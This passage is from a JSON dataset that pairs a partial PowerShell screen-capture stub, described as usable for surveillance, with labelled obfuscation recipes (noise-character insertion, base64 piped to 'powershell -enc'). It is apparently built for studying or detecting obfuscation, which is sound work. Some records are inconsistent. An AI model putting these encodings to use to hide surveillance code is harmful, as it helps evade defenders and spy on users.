    "origin_cmd": "Add-Type -TypeDefinition @\" using System; using System.Drawing; using System.Runtime.InteropServices; public class ScreenCapture { [DllImport(\"user32.dll\")] public static extern IntPtr GetDesktopWindow(); [DllImport(\"user32.dll\")] public static extern IntPtr GetWindowDC(IntPtr hWnd); [DllImport(\"gdi32.dll\")] public static extern bool BitBlt(IntPtr hObject, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hObjectSource, int nXSrc, int nYSrc, int dwRop); } \"@ $desktop = [ScreenCapture]::GetDesktopWindow() $dc = [ScreenCapture]::GetWindowDC($desktop) # Further code to perform screen capture goes here"
  },
  {
    "input": "Using Windows API for Screen Capturing, This script demonstrates how to use Windows API calls to capture the screen. It can be used for surveillance or information gathering.",
    "output": "cmd.insert_char('`n') | Invoke-Expression (string_replace('`n',''))",
    "label": "noise token insertion (endline)",
    "obf_category": "Noise Injection",
    "origin_nl": "Using Windows API for Screen Capturing, This script demonstrates how to use Windows API calls to capture the screen. It can be used for surveillance or information gathering.",
    "origin_cmd": "Add-Type -TypeDefinition @\" using System; using System.Drawing; using System.Runtime.InteropServices; public class ScreenCapture { [DllImport(\"user32.dll\")] public static extern IntPtr GetDesktopWindow(); [DllImport(\"user32.dll\")] public static extern IntPtr GetWindowDC(IntPtr hWnd); [DllImport(\"gdi32.dll\")] public static extern bool BitBlt(IntPtr hObject, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hObjectSource, int nXSrc, int nYSrc, int dwRop); } \"@ $desktop = [ScreenCapture]::GetDesktopWindow() $dc = [ScreenCapture]::GetWindowDC($desktop) # Further code to perform screen capture goes here"
  },
  {
    "input": "True",
    "output": "endline_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (endline) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Using Windows API for Screen Capturing, This script demonstrates how to use Windows API calls to capture the screen. It can be used for surveillance or information gathering.",
    "origin_cmd": "Add-Type -TypeDefinition @\" using System; using System.Drawing; using System.Runtime.InteropServices; public class ScreenCapture { [DllImport(\"user32.dll\")] public static extern IntPtr GetDesktopWindow(); [DllImport(\"user32.dll\")] public static extern IntPtr GetWindowDC(IntPtr hWnd); [DllImport(\"gdi32.dll\")] public static extern bool BitBlt(IntPtr hObject, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hObjectSource, int nXSrc, int nYSrc, int dwRop); } \"@ $desktop = [ScreenCapture]::GetDesktopWindow() $dc = [ScreenCapture]::GetWindowDC($desktop) # Further code to perform screen capture goes here"
  },
  {
    "input": "Using Windows API for Screen Capturing, This script demonstrates how to use Windows API calls to capture the screen. It can be used for surveillance or information gathering.",
    "output": "cmd.insert_char('@') | Invoke-Expression (string_replace('@',''))",
    "label": "noise token insertion (atsign)",
    "obf_category": "Noise Injection",
    "origin_nl": "Using Windows API for Screen Capturing, This script demonstrates how to use Windows API calls to capture the screen. It can be used for surveillance or information gathering.",
    "origin_cmd": "Add-Type -TypeDefinition @\" using System; using System.Drawing; using System.Runtime.InteropServices; public class ScreenCapture { [DllImport(\"user32.dll\")] public static extern IntPtr GetDesktopWindow(); [DllImport(\"user32.dll\")] public static extern IntPtr GetWindowDC(IntPtr hWnd); [DllImport(\"gdi32.dll\")] public static extern bool BitBlt(IntPtr hObject, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hObjectSource, int nXSrc, int nYSrc, int dwRop); } \"@ $desktop = [ScreenCapture]::GetDesktopWindow() $dc = [ScreenCapture]::GetWindowDC($desktop) # Further code to perform screen capture goes here"
  },
  {
    "input": "True",
    "output": "atsign_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (atsign) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Using Windows API for Screen Capturing, This script demonstrates how to use Windows API calls to capture the screen. It can be used for surveillance or information gathering.",
    "origin_cmd": "Add-Type -TypeDefinition @\" using System; using System.Drawing; using System.Runtime.InteropServices; public class ScreenCapture { [DllImport(\"user32.dll\")] public static extern IntPtr GetDesktopWindow(); [DllImport(\"user32.dll\")] public static extern IntPtr GetWindowDC(IntPtr hWnd); [DllImport(\"gdi32.dll\")] public static extern bool BitBlt(IntPtr hObject, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hObjectSource, int nXSrc, int nYSrc, int dwRop); } \"@ $desktop = [ScreenCapture]::GetDesktopWindow() $dc = [ScreenCapture]::GetWindowDC($desktop) # Further code to perform screen capture goes here"
  }
]